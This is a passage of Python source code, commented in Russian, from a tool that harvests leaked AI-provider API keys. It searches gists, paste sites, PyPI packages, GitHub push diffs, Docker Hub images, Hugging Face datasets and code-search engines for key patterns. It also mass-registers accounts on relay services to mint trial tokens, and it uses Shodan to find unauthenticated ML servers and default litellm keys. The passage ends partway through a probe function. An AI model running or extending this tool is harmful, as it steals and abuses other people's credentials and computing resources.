            with self._lock:
                env = (cfg.get("config") or {}).get("Env") or []
                if env:
                    blob = "\n".join(str(e) for e in env)
                    if any(
                        k in blob
                        for k in (
                            "sk-",
                            "API_KEY",
                            "api_key",
                            "apiKey",
                            "TOKEN",
                            "SECRET",
                            "ms-",
                            "hf_",
                            "gsk_",
                            "AIza",
                        )
                    ):
                        self._out.append((blob, "dockerhub:%s:latest" % repo))
                for h in (cfg.get("history") or [])[:40]:
                    cre = h.get("created_by") or ""
                    if any(
                        k in cre
                        for k in (
                            "sk-",
                            "API_KEY",
                            "api_key",
                            "TOKEN=",
                            "SECRET",
                            "ms-",
                            "gsk_",
                            "hf_",
                            "AIza",
                        )
                    ):
                        self._out.append((cre, "dockerhub-h:%s" % repo))
        except Exception:
            return


class GistSearch(Source):
    """gist.github.com SEARCH (не фид!): поисковый HTML по 'sk-ant' и т.п.
    Находит гисты, которые не попадают в 60 свежих фида."""

    name = "gist-search"

    QUERIES = (
        '"sk-ant-api03"',
        '"sk-proj-"',
        '"ms-" modelscope',
        '"api.siliconflow.cn" "sk-"',
        '"gpt-5.6-sol" "sk-"',
        '"glm-5.3" "sk-"',
        '"dashscope" "sk-"',
        '"kimi" "sk-" moonshot',
    )

    def fetch(self):
        out = []
        headers = {}
        _gtok = gh_token()  # один слот ротации на весь fetch (было: x2 вызов)
        if _gtok:
            headers["Authorization"] = "Bearer " + _gtok
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://gist.github.com/search?q=%s" % urlquote(q),
                    timeout=(10, 25),
                    headers=headers,
                )
                if r is None or r.status_code != 200:
                    continue
                # gist links: href="/{user}/{id}"
                gids = re.findall(
                    r'href="/([A-Za-z0-9_\-]+/([0-9a-f]{20,32}))"', r.text
                )
                for full, gid in gids[:15]:
                    # multi-file гисты: /raw отдаёт только ПЕРВЫЙ файл —
                    # через API берём ВСЕ файлы (ключи часто во втором+)
                    got = False
                    if _gtok:
                        try:
                            rg = http(
                                "GET",
                                "https://api.github.com/gists/%s" % gid,
                                timeout=(6, 12),
                                headers=headers,
                            )
                            if rg is not None and rg.status_code == 200:
                                for fn, fd in (rg.json().get("files") or {}).items():
                                    content = (fd or {}).get("content")
                                    if content:
                                        out.append((content, "gist:%s#%s" % (full, fn)))
                                        got = True
                        except Exception:
                            pass
                    if got:
                        continue
                    try:
                        t, _ = fetch_text(
                            "https://gist.githubusercontent.com/%s/raw" % full,
                            (6, 15),
                            400_000,
                        )
                        if t:
                            out.append((t, "gist:%s" % full))
                    except Exception:
                        continue
                time.sleep(1)
            except Exception:
                continue
        return out


class PasteMegaScan(Source):
    """Мега-скан паст-сайтов: rentry.co, 0x0.st, ix.io, paste.rs, p.ip.fi,
    dpaste.com, paste.debian.net,paste.centos.org, termbin-стиль.
    rentry — место тусовки ключ-сцены; остальные — безконтрольные аплоады."""

    name = "pastes-mega"

    RENTRY_SEEDS = (
        "keys",
        "api",
        "claude",
        "gpt",
        "aikeys",
        "freeapi",
        "leaked",
        "llm",
        "openai",
        "proxy",
    )

    def fetch(self):
        out = []
        # 1) rentry.co случайные/known URL через API статистики недоступны —
        #    но есть поиск по Google (уже в se_queries) + прямые проверки
        # 2) 0x0.st /paste-хосты: нет листинга, но termbin и paste.rs имеют индексы?
        # 3) paste.ee листинг
        for u in (
            "https://paste.ee/",
            "https://paste.rs/",
            "https://ix.io/",
            "https://0x0.st/",
            "https://dpaste.com/",
            "https://paste.debian.net/",
            "https://paste.centos.org/",
        ):
            try:
                t, code = fetch_text(u, (8, 15), 200_000)
                if t and code == 200:
                    out.append((t, "pasteindex:%s" % u))
            except Exception:
                continue
        # 4) rentry: пробуем создать страницу-пинг + известные слаги
        for slug in self.RENTRY_SEEDS:
            for u in ("https://rentry.co/%s" % slug, "https://rentry.co/%s/raw" % slug):
                try:
                    t, code = fetch_text(u, (8, 15), 200_000)
                    if t and code == 200 and len(t) > 50:
                        out.append((t, "rentry:%s" % slug))
                except Exception:
                    continue
        # 5) telegra.ph API — can't list, but /@search doesn't exist; via web-search
        return out


class PyPITarballs(Source):
    """PyPI: пакеты-прокси/тулкиты со встроенными ключами в .py/.cfg.
    pypi.org/search заблокирован для ботов -> используем известные имена
    + gpt4free-подобные пакеты, тянем свежие tarball'ы."""

    name = "pypi"

    # llm-proxy/ai-key пакеты: стабильный список + ротация по суффиксам
    BASE_PKGS = [
        "gpt4free",
        "freegpt",
        "openai-proxy",
        "llm-proxy",
        "llm-gateway",
        "chatgpt-proxy",
        "ai-gateway",
        "litellm",
        "openrouter",
        "simple-openai",
        "pygpt",
        "gpt-cli",
        "claudia",
        "claude-api",
        "anthropic-proxy",
        "llm-proxy-server",
        "openai-free",
        "chatgpt-free",
        "gptany",
        "requests-chatgpt",
        "chatgpt-api",
        "openaichat",
        "llama-api",
        "tekore",
        "deepl",
        "cohere",
        "qianfan",
        "dashscope",
        "zhipuai",
        "moonshot",
        "minimax",
        "sparkai",
        "baichuan",
        "ernie",
    ]

    def fetch(self):
        out = []
        import tarfile, io, zipfile

        # актуальные версии через /json
        for name in self.BASE_PKGS:
            try:
                r = http("GET", "https://pypi.org/pypi/%s/json" % name, timeout=(8, 15))
                if r is None or r.status_code != 200:
                    continue
                j = r.json()
                # sdist (.tar.gz) ИЛИ wheel (.whl) — многие пакеты только wheel
                urls = [
                    u
                    for u in (j.get("urls") or [])
                    if u.get("url", "").endswith((".tar.gz", ".whl"))
                ]
                if not urls:
                    continue
                # предпочитаем sdist (исходники полнее), иначе wheel
                urls.sort(key=lambda u: 0 if u["url"].endswith(".tar.gz") else 1)
                r2 = http("GET", urls[0]["url"], timeout=(10, 30))
                if r2 is None or r2.status_code != 200:
                    continue
                buf = io.BytesIO(r2.content)
                is_whl = urls[0]["url"].endswith(".whl")
                try:
                    if is_whl:
                        archive = zipfile.ZipFile(buf)
                        members = [archive.getinfo(n) for n in archive.namelist()[:120]]

                        def read_one(m):
                            return archive.read(m.filename)
                    else:
                        archive = tarfile.open(fileobj=buf, mode="r:gz")
                        members = archive.getmembers()[:120]

                        def read_one(m):
                            fd = archive.extractfile(m)
                            return fd.read() if fd else b""

                    for member in members:
                        mname = member.filename if is_whl else member.name
                        if not mname.endswith(
                            (".py", ".cfg", ".env", ".toml", ".ini", ".txt")
                        ):
                            continue
                        if member.size > 300_000:
                            continue
                        try:
                            content = read_one(member).decode("utf-8", "replace")
                            if any(
                                k in content
                                for k in (
                                    "sk-",
                                    "api_key",
                                    "API_KEY",
                                    "apiKey",
                                    "gsk_",
                                    "hf_",
                                    "AIza",
                                    "xoxb-",
                                    "ghp_",
                                    "glpat-",
                                )
                            ):
                                out.append(
                                    (
                                        content,
                                        "pypi:%s/%s" % (name, mname.split("/")[-1]),
                                    )
                                )
                        except Exception:
                            continue
                    archive.close()
                except Exception:
                    continue
            except Exception:
                continue
        return out


class StackOverflow(Source):
    """StackExchange API: посты с 'leaked api key' / реальными sk- ключами."""

    name = "stackoverflow"

    def fetch(self):
        out = []
        for q in (
            '"sk-ant-api03"',
            '"sk-proj-" api key',
            "leaked openai key",
            '"api key" claude accidentally',
            "api key posted",  # intitle: — не API-синтаксис, матчился литералом
        ):
            try:
                r = http(
                    "GET",
                    "https://api.stackexchange.com/2.3/search/advanced?"
                    "order=desc&sort=activity&q=%s&site=stackoverflow&pagesize=15&filter=withbody"
                    % urlquote(q),
                    timeout=(10, 20),
                )
                if r is None or r.status_code != 200:
                    continue
                j = r.json()
                # backoff: SE банит игнорирующих (было: капали без пауз)
                try:
                    bo = int(j.get("backoff") or 0)
                    if bo:
                        time.sleep(bo)
                except Exception:
                    pass
                for it in (j.get("items") or [])[:15]:
                    body = it.get("body") or ""
                    title = it.get("title") or ""
                    if body or title:
                        txt = htmllib.unescape(
                            re.sub(r"<[^>]+>", " ", body + " " + title)
                        )
                        out.append((txt, "so:%s" % it.get("question_id")))
                time.sleep(1)
            except Exception:
                continue
        return out


class Codeberg(Source):
    """Codeberg (Gitea) — открытые репо; code search Gitea API."""

    name = "codeberg"

    def fetch(self):
        out = []
        # Gitea code search: /api/v1/repos/search?q=... ищет по репо-метаданным
        for q in ("sk-ant-api03", "openai-proxy", "llm-proxy", "new-api", "one-api"):
            try:
                r = http(
                    "GET",
                    "https://codeberg.org/api/v1/repos/search?q=%s&limit=10"
                    % urlquote(q),
                    timeout=(10, 20),
                )
                if r is None or r.status_code != 200:
                    continue
                for repo in (r.json().get("data") or [])[:10]:
                    full = repo.get("full_name")
                    if not full:
                        continue
                    # raw README
                    for branch in ("main", "master"):
                        try:
                            t, _ = fetch_text(
                                "https://codeberg.org/%s/raw/branch/%s/README.md"
                                % (full, branch),
                                (6, 12),
                                200_000,
                            )
                            if t:
                                out.append((t, "codeberg:%s" % full))
                                break
                        except Exception:
                            continue
                    # contents API: жирные файлы в корне (.env, config.*, keys.*)
                    # — ключи НЕ в README (было: только README = упускали всё)
                    try:
                        rc = http(
                            "GET",
                            "https://codeberg.org/api/v1/repos/%s/contents" % full,
                            timeout=(8, 15),
                        )
                        if rc is not None and rc.status_code == 200:
                            for ent in (rc.json() or [])[:40]:
                                fn = str(ent.get("name") or "").lower()
                                if not re.search(
                                    r"^(\.env|.*\.env|config\.(json|ya?ml|py)|"
                                    r"keys?\.|secrets?\.|credentials|tokens?\.)",
                                    fn,
                                ):
                                    continue
                                du = ent.get("download_url")
                                if not du:
                                    continue
                                t2, _ = fetch_text(du, (6, 12), 200_000)
                                if t2:
                                    out.append((t2, "codeberg-file:%s/%s" % (full, fn)))
                    except Exception:
                        pass
            except Exception:
                continue
        return out


class GitHubEvents(Source):
    """GitHub Events firehose: публичные пуши. Ключи в ДИФФАХ коммитов,
    не в месседжах — фильтруем по имени репо (AI-ish) и сканируем патчи."""

    name = "gh-events"

    AI_REPOS = (
        "llm",
        "openai",
        "claude",
        "proxy",
        "api",
        "gpt",
        "ai",
        "chat",
        "model",
        "deepseek",
        "agent",
        "anthropic",
        "gemini",
        "kimi",
        "moonshot",
        "bot",
        "copilot",
        "cursor",
        "code",
        "sdk",
        "client",
        "wrapper",
    )

    def fetch(self):
        if not gh_token():
            return []
        out = []
        headers = {
            "Accept": "application/vnd.github+json",
            "Authorization": "Bearer " + gh_token(),
        }
        fetched = 0
        for page in (1, 2, 3):
            try:
                r = http(
                    "GET",
                    "https://api.github.com/events?per_page=100&page=%d" % page,
                    timeout=(8, 15),
                    headers=headers,
                )
                if r.status_code != 200:
                    break
                for ev in r.json()[:100]:
                    if ev.get("type") != "PushEvent":
                        continue
                    rname = (ev.get("repo") or {}).get("name", "")
                    # только AI-ish репо — там .env с ключами
                    if not any(k in rname.lower() for k in self.AI_REPOS):
                        continue
                    for commit in (ev.get("payload") or {}).get("commits") or []:
                        if fetched >= 80:  # пул токенов: 4×5000/час — можно жирнее
                            break
                        csha = commit.get("sha")
                        rurl = ev.get("repo", {}).get("url")
                        if not (csha and rurl):
                            continue
                        try:
                            r2 = http(
                                "GET",
                                rurl + "/commits/" + csha,
                                timeout=(6, 12),
                                headers=headers,
                            )
                            fetched += 1
                            if r2.status_code == 403:
                                return out  # rate-limit: дальше всё будет 403 —
                            # не жжём цикл впустую (было: continue по всем эвентам)
                            if r2.status_code != 200:
                                continue
                            for f in (r2.json().get("files") or [])[:8]:
                                patch = f.get("patch") or ""
                                if not patch:
                                    continue
                                # сканируем патч напрямую (ключи в диффах)
                                if re.search(
                                    r"sk-[A-Za-z0-9_\-]{20,}|ms-[0-9a-f-]{36}|"
                                    r"gsk_[A-Za-z0-9]{30,}|hf_[A-Za-z0-9]{30,}|"
                                    r"AIza[0-9A-Za-z_\-]{35}|sk-ant-[a-z0-9]{2,6}-|"
                                    r"sessionKey|claudeAiOauth|nvapi-|glpat-|"
                                    r"github_pat_|pplx-[0-9a-f]{40}|"
                                    r"T3BlbkFJ",  # OpenAI-ключи (вкл. битые вставки)
                                    patch,
                                ):
                                    out.append(
                                        (
                                            patch,
                                            "gh-push:%s@%s"
                                            % (rurl.split("repos/")[-1], csha[:8]),
                                        )
                                    )
                        except Exception:
                            continue
            except Exception:
                break
        return out


class Lobsters(Source):
    """Lobste.rs — HN-клон без авторизации; свежие AI/LLM-посты + комменты."""

    name = "lobsters"

    def fetch(self):
        out = []
        try:
            r = http(
                "GET",
                "https://lobste.rs/t/ai.json?limit=50",
                timeout=(10, 20),
                headers={"Accept": "application/json"},
            )
            if r is None or r.status_code != 200:
                return out
            for story in r.json()[:50]:
                title = story.get("title") or ""
                desc = story.get("description") or ""
                txt = title + " " + desc
                if txt.strip():
                    out.append((txt, "lobsters:%s" % story.get("short_id")))
        except Exception:
            pass
        return out


class RelayBoards(Source):
    """Лидерборды релеев (veridrop.org, hvoy.ai/APIreview, GitHub-листы).
    Даёт: живые new-api/one-api инстансы с регистрацией и trial-кредитами,
    открытые /v1/models (мисконфиг) и эндпоинты для валидации найденных ключей."""

    name = "relay-boards"

    BOARD_SEEDS = (
        [
            "https://veridrop.org",
            "https://veridrop.org/claude",
            "https://veridrop.org/gemini",
            "https://veridrop.org/gpt",
            "https://www.hvoy.ai/APIreview.html",
            "https://raw.githubusercontent.com/zzsting88/relayAPI/main/README.md",
        ]
        + [
            # кастомные борды из конфига
        ]
    )

    SKIP = {
        "veridrop.org",
        "www.hvoyai.com",
        "hvoyai.com",
        "github.com",
        "googletagmanager.com",
        "w3.org",
        "schema.org",
        "t.me",
        "telegram.me",
        "google.com",
        "baidu.com",
        "qq.com",
        "reactjs.org",
        "reactrouter.com",
        "radix-ui.com",
        "cloudflareinsights.com",
        "www.clarity.ms",
        "artificialanalysis.ai",
        "llm-stats.com",
        "www.swebench.com",
        "www.tbench.ai",
        "labs.scale.com",
        "scale.com",
        "openrouter.ai",
        "bigmodel.cn",
        "moonshot.cn",
        "deepseek.com",
        "docs.hvoyai.com",
        "googleapis.com",
        "sedo.com",
        "www.cc",
        "api.example.com",
        "localhost",
        "2fchintao.ai",
        "2fddtnew.com",
        "2fgithub.com",
        "2fhao.ai",
        "2ftoolcode.top",
        "2ftotokens.cc",
        "2fwww.cc",
        "2fyundu.lol",
        "example.com",
        "section.link",
        "style.top",
        "max.cc",
    }

    def fetch(self):
        seeds = self.BOARD_SEEDS + list(CFG.get("relay_boards", []))
        doms = set()
        for u in seeds:
            try:
                t, code = fetch_text(u, (10, 25), 900_000)
                if not t:
                    continue
                for m in re.finditer(r"/go/([a-z0-9][a-z0-9\.\-]+)", t, re.I):
                    doms.add(m.group(1).lower())
                for m in re.finditer(r"relaySite\?target=([^&\"\s]+)", t):
                    real = unquote(unquote(m.group(1)))
                    mm = re.match(r"https?://([^/\?]+)", real)
                    if mm:
                        doms.add(mm.group(1).lower())
                for m in re.finditer(
                    r"\b((?:api\.)?[a-z0-9][a-z0-9\-]*\.(?:com|top|site|info|"
                    r"online|fun|ai|dev|cc|net|xyz|lol|icu|shop|pro|vip|link|org))\b",
                    t,
                    re.I,
                ):
                    d = m.group(1).lower()
                    if d not in self.SKIP:
                        doms.add(d)
            except Exception:
                continue
        # fingerprint: new-api инстансы с регистрацией -> текст для экстрактора
        out = []
        lines = ["# relay boards snapshot %s" % time.strftime("%Y-%m-%d %H:%M")]
        reg_hosts = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
            futs = {ex.submit(self._fp, d): d for d in sorted(doms)[:80]}
            for f in concurrent.futures.as_completed(futs):
                try:
                    res = f.result(timeout=60)
                except Exception:
                    continue
                if not res or not res.get("alive"):
                    continue
                line = "base=%s name=%s register=%s trial=%s" % (
                    res["api_base"],
                    res.get("name") or "?",
                    res.get("register"),
                    res.get("trial"),
                )
                lines.append(line)
                if res.get("register"):
                    reg_hosts.append(res["api_base"])
        out.append(("\n".join(lines), "relay-boards:%d-хостов" % len(reg_hosts)))
        # регистрируемые new-api с trial: полный цикл register->login->token
        for base in reg_hosts[:10]:
            try:
                rec = self._try_register(base)
            except Exception:
                rec = None
            if rec:
                # готовая запись: валидированный ключ с базой — сразу в стор+десктоп
                store(rec)
                log("  ✅ RELAY-REGISTER: %s @ %s" % (rec["key"][:20] + "…", base))
        return out

    def _fp(self, domain):
        try:
            r = http("GET", "https://" + domain, timeout=(8, 15))
            if r is None:
                return None
            if r.status_code >= 500:
                return None
            # чистый scheme://netloc (было: split("/?") оставлял путь/квери,
            # если редирект на /login?next=/ — кривой api_base)
            try:
                _pu = urlparse(r.url or ("https://" + domain))
                base = "%s://%s" % (_pu.scheme or "https", _pu.netloc or domain)
            except Exception:
                base = "https://" + domain
            res = {
                "domain": domain,
                "alive": True,
                "api_base": base,
                "framework": None,
                "name": None,
                "register": None,
                "trial": None,
            }
            r2 = http("GET", base + "/api/status", timeout=(8, 15))
            if r2 is not None and r2.status_code == 200:
                try:
                    j = r2.json().get("data") or {}
                    res["framework"] = "new-api/one-api"
                    res["name"] = j.get("system_name")
                    res["register"] = bool(
                        j.get("register_enabled", j.get("RegisterEnabled"))
                    )
                    # trial credit в настройках может быть виден в /api/setup
                    r3 = http("GET", base + "/api/setup", timeout=(6, 10))
                    if r3 is not None and r3.status_code == 200:
                        try:
                            s = r3.json().get("data") or {}
                            res["trial"] = s.get("trial_credit") or s.get("trial")
                        except Exception:
                            pass
                except Exception:
                    pass
            return res
        except Exception:
            return None

    def _try_register(self, base):
        """new-api ПОЛНЫЙ цикл: register -> login (cookie-сессия) -> создать токен
        -> настоящий sk-ключ с trial-кредитами. Возвращает готовую запись-found."""
        import secrets as _sec

        username = "kh" + _sec.token_hex(5)
        password = "Kh!" + _sec.token_hex(8)
        sess = requests.Session()
        sess.headers.update(UA)
        try:
            sess.get(base, timeout=(8, 15), verify=False)  # warm-up cookies
        except Exception:
            pass
        try:
            r = sess.post(
                base + "/api/user/register?turnstile=",
                json={
                    "username": username,
                    "password": password,
                    "password2": password,
                    "email": "",
                },
                timeout=(10, 20),
                verify=False,
            )
            if r.status_code != 200:
                return None
            j = r.json()
            if not j.get("success"):
                return None  # регистрация закрыта/верификация email/капча
        except Exception:
            return None
        # логин -> cookie-сессия
        try:
            r2 = sess.post(
                base + "/api/user/login?turnstile=",
                json={"username": username, "password": password},
                timeout=(10, 20),
                verify=False,
            )
            if r2.status_code != 200 or not r2.json().get("success"):
                return None
        except Exception:
            return None
        # создаём токен (unlimited_quota — системная квота юзера всё равно режет)
        try:
            r3 = sess.post(
                base + "/api/token/",
                json={
                    "name": "kh",
                    "remain_quota": 100000,
                    "expired_time": -1,
                    "unlimited_quota": True,
                    "model_limits_enabled": False,
                    "model_limits": "",
                    "allow_ips": "",
                    "group": "",
                },
                timeout=(10, 20),
                verify=False,
            )
            key = None
            if r3.status_code == 200 and r3.json().get("success"):
                d = r3.json().get("data") or {}
                if isinstance(d, dict):
                    key = d.get("key") or d.get("token")
            if not key:
                # может, токен уже есть (trial создаётся автоматически)
                r4 = sess.get(
                    base + "/api/token/?p=0&size=10", timeout=(10, 20), verify=False
                )
                if r4.status_code == 200 and r4.json().get("success"):
                    d4 = r4.json().get("data")
                    # new-api варианты: data = {"items":[...]} ИЛИ data = [...]
                    if isinstance(d4, list):
                        items = d4
                    else:
                        items = ((d4 or {}).get("items")) or []
                    if items:
                        key = items[0].get("key")
        except Exception:
            return None
        if not key:
            return None
        # прогоняем через обычный валидатор — получаем модели/баланс
        v = validate(key, base, "relay-register", "relay-register:%s" % base)
        return v


class Searchcode(Source):
    """searchcode.com — бесплатный код-поиск по GitHub/GitLab/Bitbucket (без токена)."""

    name = "searchcode"

    QUERIES = (
        "sk-ant-oat01",
        "sk-ant-api03",
        "sk-or-v1-",
        "sk-proj-",
        "claudeAiOauth",
        "sk-ant-sid01",
        "oauthAccount claude",
        "api.siliconflow.cn sk-",
        "dashscope sk-",
        "api.deepseek.com sk-",
        "modelscope ms-",
    )

    def fetch(self):
        out = []
        for q in self.QUERIES:
            try:
                r = http(
                    "GET",
                    "https://searchcode.com/api/codesearch_I/?q=%s&per_page=20"
                    % urlquote(q),
                    timeout=(10, 20),
                    headers={"Accept": "application/json"},
                )
                if r.status_code != 200:
                    continue
                for res in (r.json().get("results") or [])[:20]:
                    lines = res.get("lines") or {}
                    body = "\n".join(str(v) for v in lines.values())
                    if body.strip():
                        out.append(
                            (
                                body,
                                "searchcode:%s/%s"
                                % (
                                    res.get("repo", "?")[-40:],
                                    res.get("filename", "?"),
                                ),
                            )
                        )
            except Exception:
                continue
            time.sleep(1.0)
        return out


class PublicWWW(Source):
    """publicwww.com — поиск по исходному коду веб-страниц (сниппеты с ключами)."""

    name = "publicwww"

    QUERIES = ('"sk-ant-oat01"', '"sk-ant-api03"', '"sk-or-v1-"', '"setup_token"')

    def fetch(self):
        out = []
        for q in self.QUERIES:
            for page in (1, 2):
                try:
                    u = "https://publicwww.com/websites/%s/" % urlquote(q)
                    if page > 1:
                        u += "%d.html" % page
                    t, code = fetch_text(u, (10, 25), 500_000)
                    if not t or code != 200:
                        break
                    plain = htmllib.unescape(re.sub(r"<[^>]+>", " ", t))
                    if len(plain) > 100:
                        out.append((plain, "publicwww:%s p%d" % (q[:18], page)))
                except Exception:
                    continue
                time.sleep(2.0)
        return out


class Lemmy(Source):
    """Lemmy (федиверс) — свежие посты/комменты с ключами, без авторизации."""

    name = "lemmy"

    def fetch(self):
        out = []
        for q in ('"sk-ant"', '"free api key" llm', "claude api key", '"sk-proj-"'):
            try:
                r = http(
                    "GET",
                    "https://lemmy.world/api/v3/search?q=%s&limit=20&sort=New"
                    % urlquote(q),
                    timeout=(10, 20),
                    headers={"Accept": "application/json"},
                )
                if r.status_code != 200:
                    continue
                j = r.json()
                for c in (j.get("comments") or [])[:20]:
                    body = (c.get("comment") or {}).get("content") or ""
                    if len(body) > 30:
                        out.append(
                            (body, "lemmy:c:%s" % (c.get("comment") or {}).get("id"))
                        )
                for p in (j.get("posts") or [])[:20]:
                    body = (
                        ((p.get("post") or {}).get("body") or "")
                        + "\n"
                        + ((p.get("post") or {}).get("name") or "")
                    )
                    if len(body) > 30:
                        out.append(
                            (body, "lemmy:p:%s" % (p.get("post") or {}).get("id"))
                        )
            except Exception:
                continue
        return out


def _merge_relay_hosts(hosts, src):
    """Добавить найденные relay-домены в relay_boards.json (для RelayScanner).
    Под LOCK: read-modify-write гонялся из нескольких источников параллельно
    (потерянные записи). Плюс валидация: чистый домен, без схемы/порта."""
    if not hosts:
        return 0
    path = os.path.join(HERE, "relay_boards.json")
    with LOCK:
        rows = []
        try:
            rows = json.load(open(path, encoding="utf-8"))
        except Exception:
            rows = []
        known = {r.get("domain") for r in rows if isinstance(r, dict)}
        added = 0
        for h in hosts:
            # валидация: отрезаем схему/порт/путь (было: в файл попадали
            # "https://host:8080/x" -> api_base "https://https://host:8080/x")
            h = str(h or "").strip().lower()
            h = re.sub(r"^https?://", "", h)
            h = h.split("/")[0].split(":")[0].strip()
            if not h or not re.match(r"^[a-z0-9.\-]+\.[a-z]{2,}$", h):
                continue
            if h not in known:
                rows.append(
                    {
                        "domain": h,
                        "alive": True,
                        "framework": "discovered:%s" % src,
                        "name": None,
                        "api_base": "https://" + h,
                    }
                )
                known.add(h)
                added += 1
        if added:
            try:
                json.dump(
                    rows,
                    open(path, "w", encoding="utf-8"),
                    ensure_ascii=False,
                    indent=1,
                )
                log("  [%s] +%d relay-доменов в relay_boards.json" % (src, added))
            except Exception:
                pass
        return added


def _relay_base_domains():
    doms = []
    try:
        for r in json.load(
            open(os.path.join(HERE, "relay_boards.json"), encoding="utf-8")
        ):
            d = r.get("domain")
            if d:
                doms.append(d)
    except Exception:
        pass
    return list(dict.fromkeys(doms))


def _rot12(doms, window=12):
    """Ротационное окно по доменам релеев (было: фиксированные первые 12 —
    домены 13+ не сканировались ВООБЩЕ). Окно сдвигается каждые 10 минут."""
    if len(doms) <= window:
        return doms
    off = (int(time.time() // 600) * window) % len(doms)
    return (doms[off:] + doms[:off])[:window]


class CrtSh(Source):
    """crt.sh (Certificate Transparency): субдомены api./llm./gpt. у relay-доменов
    -> новые релеи для RelayScanner (open /api/channel = чужие ключи)."""

    name = "crtsh"

    def fetch(self):
        out = []
        found = set()
        for dom in _rot12(_relay_base_domains()):
            try:
                r = http(
                    "GET",
                    "https://crt.sh/?q=%%25.%s&output=json" % dom,
                    timeout=(15, 40),
                )
                if r.status_code != 200:
                    continue
                for row in r.json():
                    for name in str(row.get("name_value") or "").split("\n"):
                        name = name.strip().lower().lstrip("*.")
                        if name and re.match(
                            r"^(api|llm|gpt|ai|openai|proxy|chat|one|new|dash|key)\.",
                            name,
                        ):
                            found.add(name)
            except Exception:
                continue
        if found:
            _merge_relay_hosts(sorted(found), "crtsh")
            out.append(("\n".join(sorted(found)), "crtsh:%d-subs" % len(found)))
        return out


class RapidDNS(Source):
    """RapidDNS: пассивные субдомены relay-доменов (другое покрытие чем crt.sh)."""

    name = "rapiddns"

    def fetch(self):
        out = []
        found = set()
        for dom in _rot12(_relay_base_domains()):
            try:
                t, code = fetch_text(
                    "https://rapiddns.io/subdomain/%s?full=1" % dom, (12, 30), 700_000
                )
                if not t or code != 200:
                    continue
                for m in re.finditer(
                    r"<td>((?:api|llm|gpt|ai|openai|proxy|chat|one|new)\.[a-z0-9\.\-]+)</td>",
                    t,
                    re.I,
                ):
                    found.add(m.group(1).lower())
            except Exception:
                continue
        if found:
            _merge_relay_hosts(sorted(found), "rapiddns")
            out.append(("\n".join(sorted(found)), "rapiddns:%d-subs" % len(found)))
        return out


class HFDatasets(Source):
    """HF Datasets: датасеты с .env/json/txt — утёкшие ключи в обучающих данных."""

    name = "hf-datasets"

    FILE_RE = re.compile(
        r"(\.env|\.json|\.txt|\.csv|\.py|\.md|config|secret|key|token|cred)", re.I
    )

    def fetch(self):
        out = []
        ds_ids = []
        for term in ("openai", "api key", "claude", "llm proxy", "env"):
            try:
                r = http(
                    "GET",
                    "https://huggingface.co/api/datasets?search=%s&limit=12"
                    "&sort=lastModified&direction=-1" % urlquote(term),
                    timeout=(10, 30),
                )
                if r.status_code != 200:
                    continue
                for d in r.json()[:12]:
                    if d.get("id"):
                        ds_ids.append(d["id"])
            except Exception:
                continue
        ds_ids = list(dict.fromkeys(ds_ids))[:40]

        def pull(ds):
            got = []
            # P0.4: бюджет 60с + максимум 15 файлов на датасет — датасеты с
            # тысячами siblings раньше держали источник дольше 420с watchdog
            deadline = time.time() + 60
            try:
                r = http(
                    "GET",
                    "https://huggingface.co/api/datasets/%s" % ds,
                    timeout=(10, 30),
                )
                if r.status_code != 200:
                    return got
                for s in (r.json().get("siblings") or [])[:15]:
                    if time.time() >= deadline:
                        break
                    fn = s.get("rfilename", "")
                    # .env/.env.production в КОРНЕ — самые жирные файлы;
                    # старый fn.startswith(".") выкидывал именно их
                    if not self.FILE_RE.search(fn) or (
                        fn.startswith(".") and not fn.startswith(".env")
                    ):
                        continue
                    t, _ = fetch_text(
                        "https://huggingface.co/datasets/%s/raw/main/%s" % (ds, fn),
                        (5, 10),
                        250_000,
                    )
                    if t and ("sk-" in t or "api_key" in t.lower() or "AIza" in t):
                        got.append((t, "hf-ds:%s/%s" % (ds, fn)))
            except Exception:
                pass
            return got

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            for got in ex.map(pull, ds_ids):
                out.extend(got)
        return out


class OpenInfraSweep(Source):
    """Открытая ML-инфраструктура без паролей (бесплатные эндпоинты / RCE):
    ollama / vllm / openwebui / litellm (дефолтный master sk-1234!) / jupyter /
    ray / comfyui / mlflow / databricks / dify / gradio / fastchat.
    Shodan -> live-проба -> стор + TG."""

    name = "open-infra"

    QUERIES = [
        ("port:11434", "ollama"),
        ('http.html:"vllm"', "vllm"),
        ('http.title:"Open WebUI"', "openwebui"),
        ('http.html:"litellm"', "litellm"),
        ('http.title:"JupyterLab"', "jupyter"),
        ('http.title:"Ray Dashboard"', "ray"),
        ('http.title:"ComfyUI"', "comfyui"),
        ('http.title:"MLflow"', "mlflow"),
        ('http.title:"Databricks"', "databricks"),
        ('http.title:"Dify"', "dify"),
        ('http.title:"Gradio"', "gradio"),
        ('http.title:"FastChat"', "fastchat"),
        # relay-панели (жирнейший класс — каналы с апстрим-ключами внутри):
        ('http.html:"new-api"', "newapi"),
        ('http.title:"New API"', "newapi"),
        ('http.html:"one-api"', "newapi"),
        ('http.title:"One API"', "newapi"),
        # TLS-инстансы litellm (раньше мимо: пробовали только http://)
        ('http.html:"litellm" port:443', "litellm"),
        ('http.html:"LiteLLM Proxy"', "litellm"),
    ]
    PER_CYCLE = 4

    def _rec(self, addr, kind, tier, models, genkey=None, scheme="http"):
        return {
            "key": genkey or ("open://" + addr),
            "base": "%s://%s/v1" % (scheme, addr),
            "tag": "open-infra",
            "origin": "open-infra:%s:%s" % (kind, addr),
            "ts": time.time(),
            "models": models[:50],
            "n_models": len(models),
            "stars_listed": [m for m in models if STAR_RE.search(m)],
            "stars_working": [],
            "balance": None,
            "tier": tier,
            "usage": None,
            "embed": None,
            "rerank": None,
            "status": "working" if genkey else "open_relay",
        }

    def _probe(self, addr, kind):
        """Обе схемы: https первой на TLS-портах (было: только http:// — все
        TLS-only инстансы (443/8443) молча пролетали мимо)."""
        port = addr.rsplit(":", 1)[-1]
        schemes = (
            ("https", "http") if port in ("443", "8443", "9443") else ("http", "https")
        )
        for scheme in schemes:
            responded, rec = self._probe_scheme(addr, kind, scheme)
            if rec is not None:
                return rec
            if responded:
                break  # сервис ответил на этой схеме, но контент не наш — вторую не терзаем
        return None

    def _probe_scheme(self, addr, kind, scheme):
        """-> (responded: bool, rec|None). responded=False = схема мертва."""
        base = "%s://%s" % (scheme, addr)
        dead = [False]  # схема не отвечает вообще

        def _get(p, to=(4, 8)):
            try:
                return requests.get(base + p, headers=UA, timeout=to, verify=False)
            except Exception:
                return None

        try:
            if kind == "ollama":
